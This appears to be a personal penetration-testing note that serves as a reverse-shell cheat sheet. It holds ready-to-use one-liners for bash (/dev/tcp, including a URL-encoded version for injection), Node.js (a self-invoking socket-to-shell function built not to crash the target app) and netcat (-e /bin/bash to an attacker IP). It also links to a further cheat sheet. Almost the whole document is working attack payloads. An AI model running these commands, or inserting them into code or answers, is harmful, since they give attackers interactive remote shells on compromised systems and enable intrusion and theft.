# Bash

````bash
bash -i >& /dev/tcp/10.0.0.0/8080 0>&1
````

Or you can use this that is url encode
````bash
bash -c "bash -i >%26 /dev/tcp/172.21.7.214/53 0>%261"
````

Remember you have to URL encode the **&** because this cause conflict

------

# Node.js

````js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "192.168.33.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
````
https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell

-------

# Netcat

-------
Using of [[Tools/Netcat|Netcat]]

````bash
nc -e /bin/bash IPAttacker PORT
````

# Monkey pentester
You have a cheat sheet in [pentestmonkey.ney](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

-------
# Tags

#bash #node #netcat #nc #reverseShell #shell

----------
